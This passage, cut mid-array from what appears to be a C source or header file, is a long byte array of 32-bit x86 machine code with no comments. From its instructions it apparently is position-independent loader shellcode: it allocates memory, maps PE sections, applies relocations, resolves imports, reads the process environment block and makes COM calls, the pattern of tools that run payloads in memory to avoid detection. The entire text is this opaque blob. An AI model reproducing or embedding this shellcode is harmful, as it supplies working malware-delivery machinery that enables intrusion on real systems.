0x8d, 0x44, 0x24, 0x30, 0x50, 0x6a, 0x04, 0x5f, 0x57, \n  0xff, 0x74, 0x24, 0x30, 0x51, 0xff, 0x53, 0x48, 0x57, 0x68, 0x00, 0x30, \n  0x00, 0x00, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x53, 0x3c, 0xff, 0x75, \n  0x54, 0x8b, 0xf8, 0xff, 0x74, 0x24, 0x14, 0x89, 0x7c, 0x24, 0x50, 0x57, \n  0xe8, 0x46, 0x11, 0x00, 0x00, 0xff, 0x74, 0x24, 0x34, 0x6a, 0x00, 0xff, \n  0x74, 0x24, 0x24, 0xe8, 0x5b, 0x11, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x28, \n  0x83, 0xc4, 0x18, 0xeb, 0x08, 0x8b, 0x44, 0x24, 0x3c, 0x89, 0x44, 0x24, \n  0x48, 0xff, 0x75, 0x54, 0xff, 0x74, 0x24, 0x38, 0x51, 0xe8, 0x19, 0x11, \n  0x00, 0x00, 0x8b, 0x44, 0x24, 0x1c, 0x33, 0xc9, 0x83, 0x64, 0x24, 0x20, \n  0x00, 0x83, 0xc4, 0x0c, 0x89, 0x46, 0x34, 0x0f, 0xb7, 0x46, 0x14, 0x83, \n  0xc0, 0x18, 0x03, 0xc6, 0x89, 0x44, 0x24, 0x3c, 0x66, 0x3b, 0x4e, 0x06, \n  0x73, 0x44, 0x8b, 0x5c, 0x24, 0x14, 0x8d, 0x78, 0x10, 0x8b, 0xee, 0xff, \n  0x37, 0x8b, 0x47, 0x04, 0x8b, 0x77, 0xfc, 0x03, 0x44, 0x24, 0x38, 0x03, \n  0x74, 0x24, 0x14, 0x50, 0x56, 0xe8, 0xd5, 0x10, 0x00, 0x00, 0x0f, 0xb6, \n  0x06, 0x8d, 0x7f, 0x28, 0x83, 0xc4, 0x0c, 0x89, 0x47, 0xd0, 0x0f, 0xb7, \n  0x45, 0x06, 0x43, 0x3b, 0xd8, 0x72, 0xd4, 0x8b, 0x9c, 0x24, 0x54, 0x03, \n  0x00, 0x00, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x74, 0x24, 0x1c, 0x8b, 0x54, \n  0x24, 0x10, 0x8b, 0xfa, 0x2b, 0x7d, 0x34, 0x83, 0x7c, 0x24, 0x24, 0x00, \n  0x0f, 0x84, 0xc2, 0x00, 0x00, 0x00, 0x85, 0xff, 0x0f, 0x84, 0xba, 0x00, \n  0x00, 0x00, 0x8b, 0x86, 0xa0, 0x00, 0x00, 0x00, 0x8d, 0x0c, 0x10, 0x03, \n  0x44, 0x24, 0x24, 0x89, 0x44, 0x24, 0x38, 0x03, 0xc2, 0x89, 0x4c, 0x24, \n  0x20, 0x3b, 0xc8, 0x0f, 0x83, 0x9b, 0x00, 0x00, 0x00, 0x8b, 0x41, 0x04, \n  0x85, 0xc0, 0x0f, 0x84, 0x90, 0x00, 0x00, 0x00, 0x8d, 0x71, 0x08, 0xeb, \n  0x6d, 0x0f, 0xb7, 0x36, 0x8b, 0x44, 0x24, 0x20, 0x8b, 0xce, 0x81, 0xe1, \n  0xff, 0x0f, 0x00, 0x00, 0x03, 0x08, 0x8b, 0x44, 0x24, 0x1c, 0x3b, 0x48, \n  0x50, 0x73, 0x43, 0x66, 0xc1, 0xee, 0x0c, 0x66, 0x83, 0xfe, 0x0a, 0x74, \n  0x08, 0x6a, 0x03, 0x58, 0x66, 0x3b, 0xf0, 0x75, 0x05, 0x01, 0x3c, 0x11, \n  0xeb, 0x1d, 0x33, 0xc0, 0x40, 0x66, 0x3b, 0xf0, 0x75, 0x07, 0x8b, 0xc7, \n  0xc1, 0xe8, 0x10, 0xeb, 0x0b, 0x6a, 0x02, 0x58, 0x66, 0x3b, 0xf0, 0x75, \n  0x0c, 0x0f, 0xb7, 0xc7, 0x01, 0x04, 0x11, 0x8b, 0x54, 0x24, 0x10, 0xeb, \n  0x09, 0x66, 0x85, 0xf6, 0x0f, 0x85, 0x1f, 0x05, 0x00, 0x00, 0x8b, 0x74, \n  0x24, 0x14, 0x6a, 0x02, 0x59, 0x03, 0xf1, 0x8b, 0x4c, 0x24, 0x20, 0x8b, \n  0x41, 0x04, 0x03, 0xc1, 0x89, 0x74, 0x24, 0x14, 0x3b, 0xf0, 0x75, 0x89, \n  0x8b, 0x44, 0x24, 0x38, 0x8b, 0xce, 0x03, 0xc2, 0x89, 0x74, 0x24, 0x20, \n  0x3b, 0xf0, 0x0f, 0x82, 0x65, 0xff, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x1c, \n  0x8b, 0x80, 0x80, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xc4, 0x00, \n  0x00, 0x00, 0x8d, 0x34, 0x10, 0x83, 0x7e, 0x0c, 0x00, 0x89, 0x74, 0x24, \n  0x18, 0x0f, 0x84, 0xb3, 0x00, 0x00, 0x00, 0x8b, 0x46, 0x0c, 0x03, 0xc2, \n  0x50, 0x53, 0xe8, 0x3e, 0x09, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x18, 0x8b, \n  0x7e, 0x10, 0x89, 0x44, 0x24, 0x40, 0x03, 0xfa, 0x8b, 0x06, 0x03, 0xc2, \n  0x89, 0x7c, 0x24, 0x28, 0x59, 0x59, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x08, \n  0x85, 0xc9, 0x74, 0x71, 0x8b, 0x6c, 0x24, 0x38, 0x8b, 0xb4, 0x24, 0x58, \n  0x03, 0x00, 0x00, 0x79, 0x0c, 0x51, 0x6a, 0x00, 0x55, 0x53, 0xe8, 0xa4, \n  0x09, 0x00, 0x00, 0xeb, 0x32, 0x8d, 0x7a, 0x02, 0x03, 0xf9, 0x83, 0x7e, \n  0x04, 0x00, 0x74, 0x19, 0x57, 0x53, 0xe8, 0x93, 0xf2, 0xff, 0xff, 0x59, \n  0x59, 0x85, 0xc0, 0x74, 0x0c, 0x8b, 0x83, 0x08, 0x01, 0x00, 0x00, 0x8b, \n  0x7c, 0x24, 0x20, 0xeb, 0x11, 0x6a, 0x00, 0x57, 0x55, 0x53, 0xe8, 0x74, \n  0x09, 0x00, 0x00, 0x8b, 0x7c, 0x24, 0x30, 0x83, 0xc4, 0x10, 0x89, 0x07, \n  0x8b, 0x44, 0x24, 0x14, 0x8b, 0x54, 0x24, 0x10, 0x6a, 0x04, 0x59, 0x03, \n  0xc1, 0x03, 0xf9, 0x89, 0x44, 0x24, 0x14, 0x89, 0x7c, 0x24, 0x20, 0x8b, \n  0x08, 0x85, 0xc9, 0x75, 0x9e, 0x8b, 0x74, 0x24, 0x18, 0x83, 0xc6, 0x14, \n  0x89, 0x74, 0x24, 0x18, 0x83, 0x7e, 0x0c, 0x00, 0x0f, 0x85, 0x51, 0xff, \n  0xff, 0xff, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x44, 0x24, 0x1c, 0x8b, 0x80, \n  0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, \n  0x8d, 0x70, 0x04, 0x03, 0xf2, 0x89, 0x74, 0x24, 0x18, 0x8b, 0x06, 0x85, \n  0xc0, 0x74, 0x7d, 0x03, 0xc2, 0x50, 0x53, 0xe8, 0x6d, 0x08, 0x00, 0x00, \n  0x8b, 0x54, 0x24, 0x18, 0x89, 0x44, 0x24, 0x40, 0x59, 0x59, 0x85, 0xc0, \n  0x74, 0x55, 0x8b, 0x7e, 0x0c, 0x8b, 0x4e, 0x08, 0x03, 0xfa, 0x03, 0xca, \n  0x89, 0x4c, 0x24, 0x14, 0x8b, 0x07, 0x85, 0xc0, 0x74, 0x41, 0x8b, 0x6c, \n  0x24, 0x38, 0x6a, 0x04, 0x5e, 0x79, 0x04, 0x33, 0xc9, 0xeb, 0x05, 0x8d, \n  0x4a, 0x02, 0x03, 0xc8, 0x33, 0xd2, 0x85, 0xc0, 0x0f, 0x49, 0xc2, 0x50, \n  0x51, 0x55, 0x53, 0xe8, 0xc7, 0x08, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x24, \n  0x03, 0xfe, 0x83, 0xc4, 0x10, 0x89, 0x01, 0x03, 0xce, 0x8b, 0x07, 0x8b, \n  0x54, 0x24, 0x10, 0x89, 0x4c, 0x24, 0x14, 0x85, 0xc0, 0x75, 0xca, 0x8b, \n  0x74, 0x24, 0x18, 0x83, 0xc6, 0x20, 0x89, 0x74, 0x24, 0x18, 0x8b, 0x06, \n  0x85, 0xc0, 0x75, 0x87, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x44, 0x24, 0x1c, \n  0x8d, 0x7c, 0x24, 0x54, 0x6a, 0x3e, 0x59, 0x8b, 0xf5, 0x8b, 0x40, 0x28, \n  0xf3, 0xa5, 0x8b, 0x7c, 0x24, 0x58, 0x03, 0xc2, 0xc1, 0xef, 0x10, 0x6a, \n  0x04, 0x6b, 0xf7, 0x28, 0x68, 0x00, 0x30, 0x00, 0x00, 0x89, 0x44, 0x24, \n  0x34, 0x89, 0x7c, 0x24, 0x1c, 0x56, 0x6a, 0x00, 0xff, 0x53, 0x3c, 0x56, \n  0xff, 0x74, 0x24, 0x40, 0x89, 0x44, 0x24, 0x20, 0x50, 0xe8, 0x25, 0x0e, \n  0x00, 0x00, 0x33, 0xc0, 0x83, 0xc4, 0x0c, 0x40, 0x39, 0x83, 0x74, 0x05, \n  0x00, 0x00, 0x75, 0x42, 0x80, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x00, 0x75, \n  0x21, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x74, 0x24, 0x18, 0xe8, 0x24, \n  0x0e, 0x00, 0x00, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x74, 0x24, 0x48, \n  0xe8, 0x16, 0x0e, 0x00, 0x00, 0x83, 0xc4, 0x18, 0xeb, 0x18, 0x8b, 0x44, \n  0x24, 0x48, 0x85, 0xc0, 0x74, 0x10, 0xff, 0x75, 0x54, 0x50, 0xff, 0x74, \n  0x24, 0x18, 0xe8, 0xd8, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x80, 0xbb, \n  0x25, 0x06, 0x00, 0x00, 0x00, 0x75, 0x58, 0xff, 0x74, 0x24, 0x10, 0xff, \n  0x53, 0x70, 0x50, 0xff, 0x93, 0x28, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x85, 0x2d, 0x03, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x10, 0x33, 0xc9, 0x39, \n  0x4c, 0x24, 0x24, 0x68, 0x80, 0x00, 0x00, 0x00, 0x51, 0x6a, 0x02, 0x0f, \n  0x45, 0xc1, 0x21, 0x4c, 0x24, 0x34, 0x89, 0x44, 0x24, 0x1c, 0x58, 0x50, \n  0x8d, 0x44, 0x24, 0x34, 0x50, 0x51, 0x51, 0x51, 0x8d, 0x44, 0x24, 0x2c, \n  0x50, 0xff, 0x53, 0x70, 0x50, 0xff, 0x74, 0x24, 0x68, 0xff, 0x93, 0x24, \n  0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xeb, 0x02, 0x00, 0x00, 0x8d, \n  0x44, 0x24, 0x30, 0x50, 0x6a, 0x08, 0xff, 0x74, 0x24, 0x30, 0xff, 0x74, \n  0x24, 0x1c, 0xff, 0x53, 0x48, 0x33, 0xc0, 0x89, 0x44, 0x24, 0x24, 0x85, \n  0xff, 0x0f, 0x84, 0xab, 0x00, 0x00, 0x00, 0x8b, 0x7c, 0x24, 0x18, 0x8b, \n  0x74, 0x24, 0x3c, 0x83, 0xc7, 0x0c, 0x8b, 0x57, 0x18, 0x8b, 0xea, 0x8b, \n  0xca, 0xc1, 0xed, 0x1e, 0xc1, 0xea, 0x1d, 0xc1, 0xe9, 0x1f, 0x83, 0xe2, \n  0x01, 0x85, 0xd1, 0x75, 0x77, 0x85, 0xd5, 0x74, 0x04, 0x6a, 0x20, 0xeb, \n  0x2f, 0x8b, 0xc2, 0x83, 0xf0, 0x01, 0x89, 0x44, 0x24, 0x3c, 0x23, 0xc1, \n  0x85, 0xc5, 0x74, 0x0e, 0x80, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x00, 0x6a, \n  0x08, 0x5e, 0x6a, 0x04, 0xeb, 0x1d, 0x33, 0xc0, 0x40, 0x33, 0xc8, 0x8b, \n  0xc5, 0x83, 0xf0, 0x01, 0x23, 0xc1, 0x85, 0xc2, 0x74, 0x05, 0x6a, 0x10, \n  0x5e, 0xeb, 0x0c, 0x23, 0x4c, 0x24, 0x3c, 0x85, 0xcd, 0x6a, 0x02, 0x58, \n  0x0f, 0x45, 0xf0, 0x8b, 0x54, 0x24, 0x10, 0x8b, 0x0f, 0x03, 0xd1, 0x8b, \n  0x44, 0x24, 0x14, 0x48, 0x39, 0x44, 0x24, 0x24, 0x73, 0x07, 0x8b, 0x47, \n  0x28, 0x2b, 0xc1, 0xeb, 0x03, 0x8b, 0x47, 0x04, 0x83, 0x64, 0x24, 0x30, \n  0x00, 0x8d, 0x4c, 0x24, 0x30, 0x51, 0x56, 0x50, 0x52, 0xff, 0x53, 0x48, \n  0x8b, 0x44, 0x24, 0x24, 0x40, 0x83, 0xc7, 0x28, 0x89, 0x44, 0x24, 0x24, \n  0x3b, 0x44, 0x24, 0x14, 0x0f, 0x82, 0x60, 0xff, 0xff, 0xff, 0x8d, 0x44, \n  0x24, 0x30, 0x33, 0xff, 0x50, 0x6a, 0x02, 0x58, 0x50, 0xff, 0xb4, 0x24, \n  0x88, 0x00, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x3c, 0xff, 0x74, 0x24, 0x1c, \n  0xff, 0x53, 0x48, 0x8b, 0x44, 0x24, 0x1c, 0x8b, 0x4c, 0x24, 0x10, 0x8b, \n  0xb0, 0xc0, 0x00, 0x00, 0x00, 0x85, 0xf6, 0x74, 0x2a, 0x8b, 0x74, 0x0e, \n  0x0c, 0x85, 0xf6, 0x74, 0x22, 0x8b, 0x06, 0x85, 0xc0, 0x74, 0x1c, 0x6a, \n  0x04, 0x5b, 0x57, 0x6a, 0x01, 0x51, 0xff, 0xd0, 0x8b, 0x4c, 0x24, 0x10, \n  0x03, 0xf3, 0x8b, 0x06, 0x85, 0xc0, 0x75, 0xee, 0x8b, 0x9c, 0x24, 0x54, \n  0x03, 0x00, 0x00, 0x8b, 0xac, 0x24, 0x58, 0x03, 0x00, 0x00, 0x6a, 0x03, \n  0x58, 0x39, 0x45, 0x00, 0x0f, 0x85, 0xe6, 0x00, 0x00, 0x00, 0x33, 0xc0, \n  0x40, 0x57, 0x50, 0x8b, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x51, 0x03, \n  0xc1, 0xff, 0xd0, 0x80, 0xbd, 0x0c, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x84, \n  0x1d, 0x01, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0xcc, 0x00, 0x00, 0x00, 0x8b, \n  0x54, 0x24, 0x10, 0x85, 0xc9, 0x0f, 0x84, 0x0e, 0x01, 0x00, 0x00, 0x8b, \n  0x74, 0x11, 0x18, 0x85, 0xf6, 0x0f, 0x84, 0x02, 0x01, 0x00, 0x00, 0x8b, \n  0x44, 0x11, 0x20, 0x8d, 0x7e, 0xff, 0x8b, 0x6c, 0x11, 0x1c, 0x03, 0xc2, \n  0x8b, 0x4c, 0x11, 0x24, 0x03, 0xea, 0x03, 0xca, 0x89, 0x4c, 0x24, 0x3c, \n  0x8d, 0x3c, 0xb8, 0x8b, 0x8c, 0x24, 0x58, 0x03, 0x00, 0x00, 0x8b, 0x07, \n  0x81, 0xc1, 0x0c, 0x03, 0x00, 0x00, 0x03, 0xc2, 0x51, 0x50, 0xe8, 0x05, \n  0x0c, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x18, 0x59, 0x59, 0x85, 0xc0, 0x74, \n  0x0f, 0x6a, 0x04, 0x58, 0x2b, 0xf8, 0x83, 0xee, 0x01, 0x75, 0xd4, 0xe9, \n  0xc9, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x3c, 0x0f, 0xb7, 0x44, 0x70, \n  0xfe, 0x8b, 0x74, 0x85, 0x00, 0x03, 0xf2, 0x0f, 0x84, 0xb4, 0x00, 0x00, \n  0x00, 0x8b, 0xac, 0x24, 0x58, 0x03, 0x00, 0x00, 0x8d, 0xbd, 0x0c, 0x04, \n  0x00, 0x00, 0x80, 0x3f, 0x00, 0x74, 0x31, 0x83, 0xbd, 0x0c, 0x05, 0x00, \n  0x00, 0x00, 0x74, 0x12, 0x8d, 0x84, 0x24, 0x4c, 0x01, 0x00, 0x00, 0x50, \n  0x57, 0x53, 0xe8, 0xe1, 0x04, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x83, 0xbd, \n  0x0c, 0x05, 0x00, 0x00, 0x00, 0x8d, 0x84, 0x24, 0x4c, 0x01, 0x00, 0x00, \n  0x0f, 0x44, 0xc7, 0x50, 0xff, 0xd6, 0xeb, 0x59, 0xff, 0xd6, 0xeb, 0x55, \n  0x8d, 0x85, 0x0c, 0x04, 0x00, 0x00, 0x80, 0x38, 0x00, 0x74, 0x20, 0x8d, \n  0x8c, 0x24, 0x4c, 0x01, 0x00, 0x00, 0x51, 0x50, 0x53, 0xe8, 0xaa, 0x04, \n  0x00, 0x00, 0x8d, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00, 0x50, 0x53, 0xe8, \n  0x74, 0x02, 0x00, 0x00, 0x83, 0xc4, 0x14, 0x39, 0x7d, 0x04, 0x74, 0x18, \n  0x57, 0x57, 0x57, 0xff, 0x74, 0x24, 0x38, 0x57, 0x57, 0xff, 0x53, 0x5c, \n  0x85, 0xc0, 0x74, 0x15, 0x6a, 0xff, 0x50, 0xff, 0x53, 0x58, 0xeb, 0x0d, \n  0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0xff, 0x70, 0x30, 0xff, 0x54, 0x24, \n  0x30, 0x8b, 0x54, 0x24, 0x10, 0x6a, 0x03, 0x58, 0x39, 0x83, 0x30, 0x02, \n  0x00, 0x00, 0x75, 0x09, 0x6a, 0xff, 0xff, 0x53, 0x4c, 0x8b, 0x54, 0x24, \n  0x10, 0x85, 0xd2, 0x74, 0x42, 0x0f, 0xb7, 0x44, 0x24, 0x5a, 0xbe, 0x00, \n  0xc0, 0x00, 0x00, 0x6b, 0xc0, 0x28, 0x56, 0x50, 0xff, 0x74, 0x24, 0x20, \n  0xff, 0x53, 0x40, 0x8b, 0x44, 0x24, 0x48, 0x85, 0xc0, 0x74, 0x0c, 0x56, \n  0xff, 0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x50, 0xff, 0x53, 0x40, 0xff, \n  0x74, 0x24, 0x10, 0xff, 0x53, 0x70, 0x50, 0xff, 0x93, 0x28, 0x01, 0x00, \n  0x00, 0xff, 0x74, 0x24, 0x44, 0xff, 0x93, 0x90, 0x00, 0x00, 0x00, 0x8b, \n  0x84, 0x24, 0x58, 0x03, 0x00, 0x00, 0xff, 0xb0, 0x24, 0x05, 0x00, 0x00, \n  0x6a, 0x00, 0xff, 0x74, 0x24, 0x3c, 0xe8, 0xb0, 0x0a, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x40, 0x03, 0x00, 0x00, \n  0xc3, 0x81, 0xec, 0xf4, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0xfc, \n  0x02, 0x00, 0x00, 0x55, 0x56, 0x6a, 0x04, 0x8b, 0x83, 0x58, 0x0d, 0x00, \n  0x00, 0x33, 0xf6, 0x68, 0x00, 0x30, 0x00, 0x00, 0x8d, 0x04, 0x45, 0x02, \n  0x00, 0x00, 0x00, 0x50, 0x56, 0xff, 0x53, 0x3c, 0x8b, 0xe8, 0x85, 0xed, \n  0x0f, 0x84, 0x84, 0x01, 0x00, 0x00, 0x8b, 0x84, 0x24, 0x08, 0x03, 0x00, \n  0x00, 0x8b, 0x88, 0x24, 0x05, 0x00, 0x00, 0x05, 0x28, 0x05, 0x00, 0x00, \n  0x03, 0xc9, 0x51, 0x55, 0x6a, 0xff, 0x50, 0x56, 0x56, 0xff, 0x53, 0x50, \n  0x8d, 0x44, 0x24, 0x58, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, \n  0x50, 0x53, 0xe8, 0xa5, 0xdf, 0xff, 0xff, 0x8d, 0x44, 0x24, 0x4c, 0x89, \n  0x44, 0x24, 0x24, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x53, 0xe8, 0x48, 0xde, \n  0xff, 0xff, 0x8d, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, \n  0x38, 0x8d, 0x44, 0x24, 0x38, 0x50, 0x53, 0xe8, 0xdb, 0xe9, 0xff, 0xff, \n  0x83, 0xc4, 0x18, 0x56, 0x56, 0xff, 0x93, 0xec, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x85, 0xf5, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x0c, 0x50, \n  0x8d, 0x83, 0xd0, 0x08, 0x00, 0x00, 0x50, 0x6a, 0x03, 0x56, 0x8d, 0x83, \n  0xb0, 0x08, 0x00, 0x00, 0x50, 0xff, 0x93, 0xf0, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x85, 0xd1, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x8d, \n  0x44, 0x24, 0x10, 0x50, 0x8d, 0x83, 0x00, 0x09, 0x00, 0x00, 0x50, 0x8b, \n  0x11, 0x51, 0xff, 0x12, 0x85, 0xc0, 0x0f, 0x85, 0xa0, 0x00, 0x00, 0x00, \n  0x8b, 0x44, 0x24, 0x10, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x0c, 0x85, 0xc0, \n  0x0f, 0x85, 0x84, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x8d, 0x54, \n  0x24, 0x14, 0x89, 0x4c, 0x24, 0x34, 0x52, 0x51, 0x8b, 0x01, 0xff, 0x50, \n  0x0c, 0x85, 0xc0, 0x75, 0x6d, 0x57, 0x8d, 0x84, 0x24, 0x00, 0x01, 0x00, \n  0x00, 0x50, 0x8d, 0x83, 0x11, 0x06, 0x00, 0x00, 0x50, 0x53, 0xe8, 0xc9, \n  0x02, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x84, 0x24, 0x00, 0x01, 0x00, \n  0x00, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x10, \n  0x8b, 0xf8, 0x6a, 0x02, 0x57, 0x51, 0x8b, 0x11, 0xff, 0x52, 0x20, 0x57, \n  0x8b, 0xf0, 0xff, 0x93, 0xb4, 0x00, 0x00, 0x00, 0x5f, 0x85, 0xf6, 0x75, \n  0x27, 0x8b, 0x44, 0x24, 0x10, 0x33, 0xf6, 0x56, 0x56, 0x56, 0x8b, 0x08, \n  0x56, 0x56, 0x56, 0x56, 0x56, 0x55, 0x50, 0xff, 0x51, 0x14, 0x85, 0xc0, \n  0x75, 0x10, 0x8b, 0x44, 0x24, 0x0c, 0x6a, 0x02, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x14, 0xeb, 0x02, 0x33, 0xf6, 0x8b, 0x44, 0x24, 0x10, 0x50, 0x8b, \n  0x08, 0xff, 0x51, 0x08, 0x8b, 0x44, 0x24, 0x0c, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x1c, 0x8b, 0x44, 0x24, 0x0c, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x08, \n  0x8b, 0x83, 0x58, 0x0d, 0x00, 0x00, 0x8d, 0x04, 0x45, 0x02, 0x00, 0x00, \n  0x00, 0x50, 0x56, 0x55, 0xe8, 0xf6, 0x08, 0x00, 0x00, 0x83, 0xc4, 0x0c, \n  0x68, 0x00, 0xc0, 0x00, 0x00, 0x56, 0x55, 0xff, 0x53, 0x40, 0x5e, 0x5d, \n  0x5b, 0x81, 0xc4, 0xf4, 0x02, 0x00, 0x00, 0xc3, 0x81, 0xec, 0x94, 0x00, \n  0x00, 0x00, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, \n  0x9c, 0x00, 0x00, 0x00, 0x55, 0x8b, 0x40, 0x30, 0x56, 0x89, 0x44, 0x24, \n  0x0c, 0x8d, 0x83, 0x48, 0x03, 0x00, 0x00, 0x57, 0x50, 0xff, 0x53, 0x38, \n  0x8b, 0xe8, 0x33, 0xc0, 0x8b, 0x55, 0x3c, 0x03, 0xd5, 0x0f, 0xb7, 0x7a, \n  0x14, 0x0f, 0xb7, 0x72, 0x06, 0x03, 0xfa, 0x8d, 0x4f, 0x18, 0x85, 0xf6, \n  0x74, 0x12, 0x8b, 0x93, 0x40, 0x03, 0x00, 0x00, 0x39, 0x11, 0x74, 0x35, \n  0x40, 0x83, 0xc1, 0x28, 0x3b, 0xc6, 0x72, 0xf4, 0x8b, 0x74, 0x24, 0x10, \n  0x8b, 0x7c, 0x24, 0x10, 0xff, 0x53, 0x78, 0x33, 0xc9, 0x8b, 0xe8, 0x85, \n  0xf6, 0x74, 0x40, 0x8b, 0xd7, 0x8d, 0x42, 0x04, 0x89, 0x54, 0x24, 0x18, \n  0x8b, 0xd0, 0x39, 0x28, 0x74, 0x1d, 0x41, 0x3b, 0xce, 0x72, 0xee, 0x8b, \n  0x6c, 0x24, 0x18, 0xeb, 0x2e, 0x6b, 0xc0, 0x28, 0x03, 0xc7, 0x8b, 0x78, \n  0x24, 0x8b, 0x70, 0x20, 0x03, 0xfd, 0xc1, 0xee, 0x02, 0xeb, 0xc9, 0xff, \n  0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x8b, 0x6c, 0x24, 0x1c, 0x55, 0xff, \n  0x93, 0x10, 0x01, 0x00, 0x00, 0xeb, 0x08, 0x8b, 0x6c, 0x24, 0x10, 0x89, \n  0x6c, 0x24, 0x18, 0xff, 0x53, 0x74, 0x33, 0xc9, 0x8b, 0xd0, 0x85, 0xf6, \n  0x74, 0x2d, 0x39, 0x57, 0x04, 0x74, 0x0a, 0x41, 0x83, 0xc7, 0x04, 0x3b, \n  0xce, 0x72, 0xf3, 0xeb, 0x1e, 0x6a, 0x01, 0x55, 0x8d, 0x44, 0x24, 0x24, \n  0x50, 0xff, 0x93, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x08, 0x8d, 0x44, 0x24, \n  0x20, 0x50, 0x57, 0xe8, 0xd7, 0x07, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8b, \n  0x44, 0x24, 0x10, 0x8b, 0x40, 0x0c, 0x8b, 0x78, 0x0c, 0x83, 0x7f, 0x18, \n  0x00, 0x0f, 0x84, 0x1f, 0x01, 0x00, 0x00, 0x8d, 0x83, 0x70, 0x03, 0x00, \n  0x00, 0x8b, 0xd0, 0x89, 0x54, 0x24, 0x14, 0x8a, 0x02, 0x33, 0xed, 0x83, \n  0x64, 0x24, 0x10, 0x00, 0x45, 0x33, 0xc9, 0x84, 0xc0, 0x0f, 0x84, 0xed, \n  0x00, 0x00, 0x00, 0x8d, 0x5c, 0x24, 0x24, 0x8b, 0xf2, 0x2b, 0xda, 0x8b, \n  0xd5, 0x3c, 0x3b, 0x74, 0x29, 0x81, 0xf9, 0x80, 0x00, 0x00, 0x00, 0x73, \n  0x21, 0x3c, 0x77, 0x75, 0x04, 0x33, 0xed, 0xeb, 0x0e, 0x8b, 0xea, 0x3c, \n  0x70, 0x75, 0x08, 0xc7, 0x44, 0x24, 0x10, 0x01, 0x00, 0x00, 0x00, 0x88, \n  0x04, 0x1e, 0x41, 0x46, 0x8a, 0x06, 0x84, 0xc0, 0x75, 0xd1, 0x8b, 0x9c, \n  0x24, 0xa8, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0xa7, 0x00, 0x00, \n  0x00, 0x8b, 0x44, 0x24, 0x14, 0x40, 0xc6, 0x44, 0x0c, 0x24, 0x00, 0x03, \n  0xc1, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x24, 0x6a, 0x00, 0x50, \n  0xff, 0x77, 0x18, 0x53, 0xe8, 0x6a, 0x01, 0x00, 0x00, 0x8b, 0x54, 0x24, \n  0x24, 0x8b, 0xf0, 0x83, 0xc4, 0x10, 0x85, 0xf6, 0x0f, 0x84, 0x75, 0xff, \n  0xff, 0xff, 0x85, 0xed, 0x74, 0x33, 0x83, 0x7c, 0x24, 0x10, 0x00, 0x74, \n  0x10, 0xff, 0xd6, 0x8b, 0x54, 0x24, 0x14, 0x8b, 0xf0, 0x85, 0xf6, 0x0f, \n  0x84, 0x5a, 0xff, 0xff, 0xff, 0xff, 0x36, 0x53, 0xe8, 0x9a, 0xea, 0xff, \n  0xff, 0x8b, 0x54, 0x24, 0x1c, 0x59, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x44, \n  0xff, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x20, 0xeb, 0x34, 0x83, 0x7c, 0x24, \n  0x10, 0x00, 0x74, 0x10, 0xff, 0xd6, 0x8b, 0x54, 0x24, 0x14, 0x8b, 0xf0, \n  0x85, 0xf6, 0x0f, 0x84, 0x27, 0xff, 0xff, 0xff, 0xff, 0x36, 0x53, 0xe8, \n  0x67, 0xea, 0xff, 0xff, 0x8b, 0x54, 0x24, 0x1c, 0x59, 0x59, 0x85, 0xc0, \n  0x0f, 0x84, 0x11, 0xff, 0xff, 0xff, 